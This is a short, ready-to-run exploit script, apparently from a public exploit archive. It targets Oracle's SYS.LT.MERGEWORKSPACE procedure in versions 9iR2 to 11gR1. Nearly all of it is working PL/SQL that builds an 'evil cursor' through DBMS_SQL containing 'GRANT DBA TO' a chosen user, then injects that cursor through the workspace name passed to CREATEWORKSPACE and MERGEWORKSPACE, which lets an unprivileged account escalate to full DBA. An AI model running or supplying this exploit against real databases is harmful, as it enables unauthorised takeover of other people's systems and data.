Oracle SYS.LT.MERGEWORKSPACE Evil Cursor Exploit
================================================


# Title: Oracle SYS.LT.MERGEWORKSPACE Evil Cursor Exploit
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Andrea Purificato
# Published: 2009-12-01
# Verified: yes


view source
print?
-- 
-- sys-lt-mergeworkspaceV2.sql
--
--
-- Oracle SYS.LT.MERGEWORKSPACE exploit (9iR2/10gR1,10gR2,11gR1)
-- Evil cursor technique
--
-- Grant dba permission to unprivileged user
-- 
-- 
-- REF: http://www.google.it/search?q=SYS.LT.MERGEWORKSPACE
-- 
-- AUTHOR: Andrea "bunker" Purificato
-- http://rawlab.mindcreations.com
--
--
set serveroutput on;
prompt [+] sys-lt-mergeworkspaceV2.sql exploit
prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
prompt [+] 37F1 A7A1 BB94 89DB A920 3105 9F74 7349 AF4C BFA2
prompt
undefine the_user;
accept the_user char prompt &#039;Target username (default TEST): &#039; default &#039;TEST&#039;;
prompt
prompt [-] Creating evil cursor...
 
DECLARE
MYC NUMBER;
BEGIN
MYC := DBMS_SQL.OPEN_CURSOR;
DBMS_SQL.PARSE(MYC,&#039;declare pragma autonomous_transaction;begin execute immediate &#039;&#039;GRANT DBA TO &the_user&#039;&#039;;commit;end;&#039;,0);
SYS.LT.CREATEWORKSPACE(&#039;x&#039;&#039;||dbms_sql.execute(&#039;||MYC||&#039;)||&#039;&#039;--&#039;);
SYS.LT.MERGEWORKSPACE(&#039;x&#039;&#039;||dbms_sql.execute(&#039;||MYC||&#039;)||&#039;&#039;--&#039;);
END;
/
 
prompt [-] YOU GOT THE POWAH!!



